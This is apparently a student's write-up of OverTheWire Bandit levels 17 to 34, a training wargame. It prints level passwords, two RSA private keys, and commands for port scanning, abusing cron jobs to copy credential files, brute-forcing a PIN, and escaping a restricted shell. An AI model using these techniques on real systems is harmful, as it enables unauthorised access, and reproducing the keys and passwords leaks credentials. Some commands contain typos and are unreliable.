# WriteUps 

## -> level 17 : 
  i used the command `nmap -p 31000-32000 localhost`  so i can find the port which is open 

i used this command to check the five ports found iif they are connected to ssl/tls , `openssl s_client -connect localhsot:$port` 
   
the two ports found are : 31790 and 31518  

i used the command `echo "kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx" | ncat --ssl localhost 31790` with the two ports and submitted the current password , the port 31790 reponse with the priavte rsakey 

< -----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY----->

i created a file called a raskey , then executed this command `ssh -i rsakey -p 2220 bandit17@bandit.labs.overthewire.org`

## -> level 18 :  password : x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO
 i used this command ` diff passwords.new passwords.old` so i can the diffrent line between the file which is the code for the next level 

## -> level 19 : cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8
 `ssh bandit18@bandit.labs.overthewire.org -p 2220 cat readme`  this command is used to excute the command cat readme without having to login  

## ->level 20 : 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
`ls -l ` : to find the name of the binary file 
`./bandit20-do cat /ec/bandit_pass/bandit20` : the first part of the command is used to excute the setuid binary file , then the other part to cat the password , *** in the descripion they ave the path '/etc/bandit_pass' and this is just a dorectory , so i had to cat the file bandit20 located in this file .  

## -> level 21 : EeoULMCra2q0dSkYj561DX7s1CpBuOBt
so i had to open twoterminals and connect to the profile bandit20 , after that i connected to localhost with the command `nc -lvp 9999` in te first terminal and the second i used `./suconnect 9999` in the second terminal , i sent from the first one the password of the previous level and got the password for the next one . 

## -> level 22: tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
i changed directory with  `cd /etc/cron.d ` the, with `ls` i found the file named "cronjob_bandit22" , i used the command `cat` to see what it contains , it showed me the path for the script file , i used the `cat ` to find which command is runnig with that script , reading the script showed that he password is writtten in a file so i used this command to find the passwrod `cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv` 

## -> level 23 : 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
the level is about a program which is running autmatically . So to run the run the program with this command `cat /usr/bin/cronjob_bandit23.sh` it showed this code: 

`
#!/bin/bash myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
`
so i created a variable with `$myname` and then `myname=bandit23` , after that i excuted the next commands from  the script , in the end , i read my password file with the command `cat /tmp/8ca319486bfbbc3663ea0fbe81326349` 


## -> level 24 : gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
 i went with  `cd /etc/cron.d` and used the command `ls ` and  i found the cronjob_bandit24 file , i excuted the command `cat /usr/bin/cronjob_bandit24.sh` 
 and found the script : 

`#!/bin/bash 
myname=$(whoami) 
cd /var/spool/$myname/foo 
echo "Executing and deleting all scripts in /var/spool/$myname/foo:" for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done`

i went `/tmp` and cretaed `level24` directory where i created a file `password.txt ` and `script1.sh ` which is :  

`#!/bin/bash 
  cat /etc/bandit_pass/bandit24 > /tmp/level24/password.txt 
` 
the i used the command `chmod 777 /tmp/level24 . ` and `chmod +x /tmp/level24/script1.sh ` to give the permission needed (cat) for the automatic program , i copied this file `cp /tmp/level24/script1.sh /var/spool/bandit24/foo/pass.sh ` so the automatic program will excute it and write the password in `/tmp/level24/password.txt` and the script `pass.sh` will be deleted , and with `cat /tmp/level24/password.txt` i got the password 

## -> level 25 : iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
the description of the level says that i have to communicate with the deamon which is running on the port 30002 , and send him the password of the level 24 + code pin , the code pin is between 0000 and 9999 , so i have to brute force the code pin , so i did this shell script which does this : 
1. Verify if the i is between 0000 and 9999 
2. send "password_level_24 code_pin" to localhost on port 30002 
3. if it was the correct , it breaks from the While loop , else it increments the code_pin 

the script :
 ```bash 
   #!/bin/bash
 password24="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"
 pin=0

 while [ ${pin} -le 9999  ]; do
      #had command bch le pin code ykon en format de 4 chiffres et si oblgé>

      format_pin=$(printf "%04d" ${pin})
      #la sortie de la commande sera stocké dans la variable pour la vérifi>
       response=$(echo "${password24} ${format_pin}" | nc localhost 30002)

      if [[ ${response} == "Wrong! Please enter the correct current password." ]]; then
        ((pin++))
      else
        echo "correct pin found ${format_pin}/n"
        echo "the password  to the next level is ${response}"
        break
      fi 
      done
```
- when i excuted the code it taked a lot of time so i searched how my program will take and found out that it takes probably 10 minutes to run it , so i changed the method ;

i created another bash script which writes the password for level 24 and every pin code in 0000 and 9999 with this script 
```bash 
#!/bin/bash

password24="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"
pin=0



for i in $(seq -w 0 9999);do
   echo "${password24} ${i}" >> /tmp/level25/file.txt
done

echo "file.txt is ready to be used in the brute force "
``` 
and the used the command `cat /tmp/level25/file.txt >> nc localhost 30002 ` and then got password as a response from the server 

## -> level 26 :  s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
i used `ls` command and found this rsa key 
```-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
/5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG
xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi
1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix
3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW
qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi
il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w
e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh
Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME
zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX
c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le
wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV
tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI
2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU
i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj
6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm
pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz
JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3
JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd
1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh
ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe
euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5
/Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t
IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
-----END RSA PRIVATE KEY----- 
```

i used this private key to login with the command `ssh -i bandit26.sshkey bandit26@localhost -p 2220 ` and it loggeed but it went out directly , with the command `cat /etc/passwd | grep bandit2 ` it showed that bandit26 is not using `/bin/bash but`| usin `/bin/showtext` which is shell script  
```
#!/bin/sh

export TERM=linux

exec more ~/text.txt
exit 0
```

so i had to stop the script in in the command more , so i minimised the terminal , and then excuted this `ssh -i bandit26.sshkey bandit26@localhost -p 2220 ` and it didn't logout , i used the `v` command which allowed me to excute commands , so i did `:set shell=/bin/bash` and i log in banidt26 and `cat /etc/bandit_pass/bandit26`


## -> level27 : upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB 

so once logged in the level 26 , i used the command `ls` and i found the file `bandit27-do` , so i excuted it and the it shows me that id needed , so i used this command `./bandit27-do cat /etc/bandit_pass/bandit27`

## -> level 28 : Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN

i used this command to clone the repo `git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo`
than i entred the password , i used the command `cd bandit27/repo/` and then `cat README `, and i got the password 


## -> level 29 : 4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7

i used the same command as the previous level just changed the 27 to 28 , then `cd /bandit28/repo ` and then `cat README.md` and i got the password 

## -> level 30 : qp30ex3VLz5MDG1n91YowTv4Q8l7CDZL

the same as the previous level 


## -> level 31 : fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy 

i used the same the commmands as the previous git challenges but this time the README.md was ampty , so i had to excute some git commands like `git status` `git branch` ect and the right one was `git tag ` and then used `git show cat ` there was aso secret and checkout tags which had the same password 

## -> level 32 : 3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K 

after cloning the repository and then cat the README.md file , i knew that i had to push the key.txt file , so i used this commands 
- `git add key.txt `
- `git commit -m "commi1`
- `gitpush origin master `
and i got the password 


## -> level 33 : tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0

so in this level once logged , it shows upper case shell , i couldn'texcute any command , but the upper case does effect only the alphabetic commands so i used `$1` then the command `ls` and then things were clear so i used `cat /etc/bandit_pass/bandit33` 

##  level 34 : 
i logged with to  the previous user and then `cat README.txt ` and found this text :  

Congratulations on solving the last level of this game!

At this moment, there are no more levels to play in this game. However, we are constantly working
on new levels and will most likely expand this game with more levels soon.
Keep an eye out for an announcement on our usual communication channels!
In the meantime, you could play some of our other wargames.

If you have an idea for an awesome new level, please let us know!

